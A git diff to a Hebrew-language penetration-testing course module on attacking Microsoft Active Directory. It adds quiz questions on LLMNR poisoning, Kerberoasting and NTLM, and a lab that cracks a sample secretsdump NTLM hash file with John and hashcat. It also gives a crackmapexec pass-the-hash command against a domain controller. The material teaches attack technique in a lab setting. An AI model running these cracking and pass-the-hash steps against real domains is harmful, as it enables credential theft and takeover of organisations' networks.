@@ -2,6 +2,8 @@
 
 > 📘 **הכול בגלילה אחת:** [**כל החומר של המודול בקובץ אחד**](כל-החומר.md) — חומר לימוד, תרגילים, תרגול ופתרונות, ברצף.
 
+> 🎬 **מודול מעשי (בענן) + הדגמה מקומית!** מעבדת AD מלאה רצה ב-**TryHackMe** (ראו אזהרת הזיכרון למטה) — שם תבצעו את כל התקיפות על DC אמיתי. אבל שלב ה-**Looting** אפשר לתרגל כאן ועכשיו: תפצחו קובץ NTLM hashes אמיתי ([`ntlm_hashes.txt`](ntlm_hashes.txt), בפורמט `secretsdump`) עם hashcat/John. אחרי כל נושא: **🧠 בדוק את עצמך**.
+
 # מודול 13 — Active Directory (AD)
 
 > **מטרות המודול:** לתקוף את הטכנולוגיה שמנהלת את **רוב הארגונים בעולם** — Microsoft Active Directory. נלמד את מבנה ה-Domain, נבצע **Enumeration** (BloodHound), ונשלוט בהתקפות המפתח: **LLMNR Poisoning**, **Kerberoasting**, **Pass-the-Hash**, ו-**AS-REP Roasting** — עד להשתלטות על ה-**Domain Controller (Domain Admin)**.
@@ -122,6 +124,13 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 > 🎯 LLMNR Poisoning הוא **נקודת הכניסה** הקלאסית: מ"אין כלום" ל"אישורי משתמש ראשונים" — לרוב תוך דקות ברשת ארגונית אמיתית.
 
+**🧠 בדוק את עצמך:** מה משיג התוקף מ-LLMNR/NBT-NS Poisoning עם Responder?
+- א) גישת Domain Admin מיידית
+- ב) את ה-NTLMv2 hash של משתמש שניסה לגשת לשם שגוי — לפיצוח offline
+- ג) את סיסמת ה-krbtgt
+
+> ✅ **תשובה: ב** — Responder מתחזה לשרת ולוכד את ה-NTLMv2 hash שהקורבן שולח. אותו מפצחים (mode 5600) כדי לקבל אישורי משתמש ראשונים.
+
 ---
 
 ## 13.6 Kerberoasting
@@ -142,6 +151,13 @@ hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
 חשבונות שירות לרוב עם סיסמאות **ישנות וחלשות** ולעיתים הרשאות גבוהות → הסלמה משמעותית.
 
 > 🔑 Kerberoasting הוא ה"מנצח" של רוב בדיקות ה-AD: שקט (לא נוגע ב-DC ישירות בצורה חשודה), אמין, ולעיתים מוביל ישר ל-Domain Admin.
+
+**🧠 בדוק את עצמך:** מדוע **כל** משתמש דומיין (גם מוגבל) יכול לבצע Kerberoasting?
+- א) כי כולם Domain Admins
+- ב) כי כל משתמש מאומת רשאי לבקש TGS של חשבונות שירות (SPN), וה-TGS מוצפן בסיסמת השירות — שנפצחת offline
+- ג) כי ה-DC פגיע לבאג
+
+> ✅ **תשובה: ב** — זו "תכונה" של Kerberos: כל משתמש יכול לבקש service ticket. ה-TGS מוצפן ב-hash סיסמת השירות, וניתן לפצח אותו offline בלי לגעת שוב ב-DC.
 
 ---
 
@@ -184,6 +200,45 @@ secretsdump.py corp.local/admin:pass@<target>      # שולף SAM + LSA
 ```
 
 > 🎯 Pass-the-Hash הוא הלב של **תנועה רוחבית ב-AD**: hash של Local Admin משותף בין מכונות → קופצים ממחשב למחשב עד ל-DC.
+
+### 🎬 הדגמה — נסה בעצמך: פצח NTLM Hashes של הדומיין (Looting) 🚩
+> אחרי `secretsdump`/DCSync מקבלים קובץ hashes. נפצח אותו כאן — מקומית, בלי DC.
+
+**הרקע:** הקובץ [`ntlm_hashes.txt`](ntlm_hashes.txt) הוא פלט טיפוסי של `secretsdump.py` — פורמט `user:rid:LM:NT:::`. נחלץ את ה-NT hashes ונפצח.
+
+**צעד 1 — הצץ בקובץ:**
+```bash
+cat ntlm_hashes.txt
+```
+👀 שלושה חשבונות (כולל `Administrator`), כל אחד עם NTLM hash.
+
+**צעד 2 — פצח עם John** (מזהה את פורמט `secretsdump` אוטומטית):
+```bash
+john --format=nt ntlm_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john --format=nt ntlm_hashes.txt --show
+```
+**או עם Hashcat** (mode 1000 = NTLM). Hashcat מצפה ל-hash "נקי", לכן קודם מחלצים רק את עמודת ה-NT (עמודה 4):
+```bash
+cut -d: -f4 ntlm_hashes.txt > nt_only.txt        # שולף רק את ה-NT hashes
+hashcat -m 1000 nt_only.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 nt_only.txt --show
+```
+👀 הסיסמאות מתפצחות: `Administrator=iloveyou`, `sqlservice=sunshine`, `jsmith=princess` — כולן חלשות.
+
+**צעד 3 — Pass-the-Hash (בלי לפצח בכלל!):** לתנועה רוחבית לא חייבים את הסיסמה — משתמשים ב-hash עצמו:
+```text
+crackmapexec smb <DC> -u Administrator -H b963c57010f218edc2cc3c229b5e4d0f
+```
+(דורש DC — הרץ בסביבת TryHackMe.)
+
+🎯 **מה קרה כאן:** NTLM הוא MD4 של הסיסמה, ללא Salt ואיטיות — לכן חלש. סיסמאות חלשות נופלות בשניות. **הגנה:** סיסמאות ארוכות, Managed Service Accounts, וניטור. שים לב: ב-Pass-the-Hash אפילו לא צריך לפצח.
+
+**🧠 בדוק את עצמך:** מדוע NTLM hashes נחשבים חלשים יחסית לפיצוח?
+- א) הם ארוכים מדי
+- ב) הם MD4 של הסיסמה — ללא Salt וללא האטה — כך שאפשר לנסות מיליארדי ניחושים בשנייה
+- ג) אי אפשר לפצח אותם כלל
+
+> ✅ **תשובה: ב** — NTLM = MD4 בלי Salt ובלי work-factor. אין הגנה מפני GPU, ואין הבדל בין שני משתמשים עם אותה סיסמה. סיסמה חלשה = פיצוח מיידי.
 
 ---
 
